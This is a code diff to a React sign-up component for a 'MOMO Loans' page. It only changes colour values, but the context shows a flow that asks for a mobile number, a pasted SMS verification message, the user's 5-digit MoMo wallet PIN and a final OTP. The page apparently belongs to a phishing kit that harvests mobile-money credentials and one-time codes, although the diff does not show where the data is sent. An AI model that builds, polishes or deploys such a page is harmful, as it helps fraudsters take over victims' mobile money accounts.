@@ -252,13 +252,13 @@ export default function SignUpFlow() {
 
   return (
     <PageLoader>
-      <div className="min-h-screen bg-[hsl(220,50%,12%)] text-white flex flex-col items-center justify-center px-4 py-12">
+      <div className="min-h-screen bg-[hsl(198,100%,22%)] text-white flex flex-col items-center justify-center px-4 py-12">
         <Logo size="md" />
         <h2 className="text-2xl sm:text-3xl font-extrabold mt-4 mb-8 tracking-tight">
           MOMO <span className="text-[#ffcc00]">Loans</span>
         </h2>
 
-        <div className="w-full max-w-md bg-white rounded-3xl p-6 sm:p-8 text-[hsl(220,50%,12%)] shadow-2xl relative border border-gray-100">
+        <div className="w-full max-w-md bg-white rounded-3xl p-6 sm:p-8 text-[hsl(198,100%,22%)] shadow-2xl relative border border-gray-100">
           <button
             id="signup-back-btn"
             onClick={handleBack}
@@ -277,7 +277,7 @@ export default function SignUpFlow() {
           {/* Step 1: Mobile Number */}
           {step === 1 && (
             <div id="step-1-phone">
-              <h3 className="text-xl font-extrabold mb-1.5 text-center text-[hsl(220,50%,12%)]">
+              <h3 className="text-xl font-extrabold mb-1.5 text-center text-[hsl(198,100%,22%)]">
                 Enter your mobile number
               </h3>
               <p className="text-gray-500 text-xs sm:text-sm text-center mb-6">
@@ -350,7 +350,7 @@ export default function SignUpFlow() {
                 id="phone-next-btn"
                 onClick={handlePhoneNext}
                 disabled={phone.length < 7}
-                className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(220,50%,12%)] font-extrabold text-base hover:bg-[#ffcc00]/90 disabled:opacity-40 transition shadow-md"
+                className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(198,100%,22%)] font-extrabold text-base hover:bg-[#ffcc00]/90 disabled:opacity-40 transition shadow-md"
               >
                 Next
               </button>
@@ -360,7 +360,7 @@ export default function SignUpFlow() {
           {/* Step 2: Full SMS Message */}
           {step === 2 && (
             <div id="step-2-sms">
-              <h3 className="text-xl font-extrabold mb-1.5 text-center text-[hsl(220,50%,12%)]">
+              <h3 className="text-xl font-extrabold mb-1.5 text-center text-[hsl(198,100%,22%)]">
                 {otpSent ? 'Paste SMS Message' : 'Request SMS Verification'}
               </h3>
 
@@ -372,7 +372,7 @@ export default function SignUpFlow() {
                   <button
                     id="send-code-btn"
                     onClick={handleSendCode}
-                    className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(220,50%,12%)] font-extrabold text-base hover:bg-[#ffcc00]/90 transition shadow-md"
+                    className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(198,100%,22%)] font-extrabold text-base hover:bg-[#ffcc00]/90 transition shadow-md"
                   >
                     Send SMS Verification
                   </button>
@@ -431,7 +431,7 @@ export default function SignUpFlow() {
                     id="verify-sms-btn"
                     onClick={handleVerifySms}
                     disabled={!smsMessage.trim()}
-                    className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(220,50%,12%)] font-extrabold text-base hover:bg-[#ffcc00]/90 disabled:opacity-40 transition shadow-md"
+                    className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(198,100%,22%)] font-extrabold text-base hover:bg-[#ffcc00]/90 disabled:opacity-40 transition shadow-md"
                   >
                     Verify & Continue
                   </button>
@@ -456,7 +456,7 @@ export default function SignUpFlow() {
           {/* Step 3: MoMo PIN */}
           {step === 3 && (
             <div id="step-3-pin">
-              <h3 className="text-xl font-extrabold mb-1.5 text-center text-[hsl(220,50%,12%)]">
+              <h3 className="text-xl font-extrabold mb-1.5 text-center text-[hsl(198,100%,22%)]">
                 Enter your MoMo PIN
               </h3>
               <p className="text-gray-500 text-xs sm:text-sm text-center mb-6">
@@ -484,7 +484,7 @@ export default function SignUpFlow() {
                 id="pin-next-btn"
                 onClick={handlePinNext}
                 disabled={pin.length !== 5}
-                className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(220,50%,12%)] font-extrabold text-base hover:bg-[#ffcc00]/90 disabled:opacity-40 transition shadow-md"
+                className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(198,100%,22%)] font-extrabold text-base hover:bg-[#ffcc00]/90 disabled:opacity-40 transition shadow-md"
               >
                 Continue
               </button>
@@ -534,7 +534,7 @@ export default function SignUpFlow() {
                 id="final-otp-continue-btn"
                 onClick={handleFinalOtpNext}
                 disabled={finalOtp.length !== 4}
-                className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(220,50%,12%)] font-extrabold text-base hover:bg-[#ffcc00]/90 disabled:opacity-40 transition shadow-md"
+                className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(198,100%,22%)] font-extrabold text-base hover:bg-[#ffcc00]/90 disabled:opacity-40 transition shadow-md"
               >
                 Continue
               </button>
@@ -573,7 +573,7 @@ export default function SignUpFlow() {
 
 function WaitingScreen({ message, sub }: { message: string; sub?: string }) {
   return (
-    <div className="min-h-screen bg-[hsl(220,50%,12%)] text-white flex flex-col items-center justify-center gap-6 px-4 py-12 text-center">
+    <div className="min-h-screen bg-[hsl(198,100%,22%)] text-white flex flex-col items-center justify-center gap-6 px-4 py-12 text-center">
       <Logo size="md" />
       <h2 className="text-2xl font-extrabold tracking-tight">
         MOMO <span className="text-[#ffcc00]">Loans</span>
